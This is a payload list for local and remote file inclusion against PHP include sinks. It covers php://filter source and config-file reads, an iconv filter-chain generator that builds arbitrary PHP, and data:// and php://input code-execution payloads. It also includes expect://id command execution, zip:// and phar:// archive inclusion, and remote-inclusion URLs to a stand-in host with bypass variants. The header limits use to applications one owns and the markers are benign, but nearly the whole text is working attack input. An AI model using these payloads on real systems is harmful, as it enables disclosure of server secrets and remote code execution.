files.content:
# Local and Remote File Inclusion: PHP Wrappers, Filters and Log/Session Vectors
# Use against include/require/file_get_contents sinks in an application you own. Read harmless files and stop at proof.

# php://filter: read source without executing it
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/etc/hostname
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/convert.iconv.utf-8.utf-16le/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
php://filter/string.strip_tags/resource=index.php
php://filter/convert.quoted-printable-encode/resource=index.php
php://filter/read=string.toupper/resource=/etc/hostname
php://filter/resource=index.php
php://filter/convert.base64-decode/resource=index.php

# php://filter chain generation (iconv-based chains that construct arbitrary content; tool-generated)
python3 php_filter_chain_generator.py --chain '<?= "filter-chain-marker"; ?>'
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
# The generated chain is long; submit it as the include parameter value and look for the marker in the response

# php://input and data:// (require allow_url_include=On)
php://input
data://text/plain,<?php echo 'lfi-data-marker'; ?>
data://text/plain;base64,PD9waHAgZWNobyAnbGZpLWRhdGEtbWFya2VyJzsgPz4=
data:text/plain,<?php echo 'lfi-data-marker'; ?>
data:text/plain;base64,PD9waHAgZWNobyAnbGZpLWRhdGEtbWFya2VyJzsgPz4=

# expect:// (requires the expect extension)
expect://id
expect://hostname

# zip:// and phar:// (include a file inside an uploaded archive)
zip://uploads/archive.zip%23marker.php
zip://uploads/avatar.jpg%23marker
phar://uploads/archive.phar/marker.php
phar://uploads/avatar.jpg/marker.php

glob:///etc/host*

http://oast.example.test/rfi-marker.txt

http://oast.example.test/rfi-marker.txt%00
https://oast.example.test/rfi-marker.txt
//oast.example.test/rfi-marker.txt

ftp://oast.example.test/rfi-marker.txt
http:\\oast.example.test\rfi-marker.txt
HtTp://oast.example.test/rfi-marker.txt
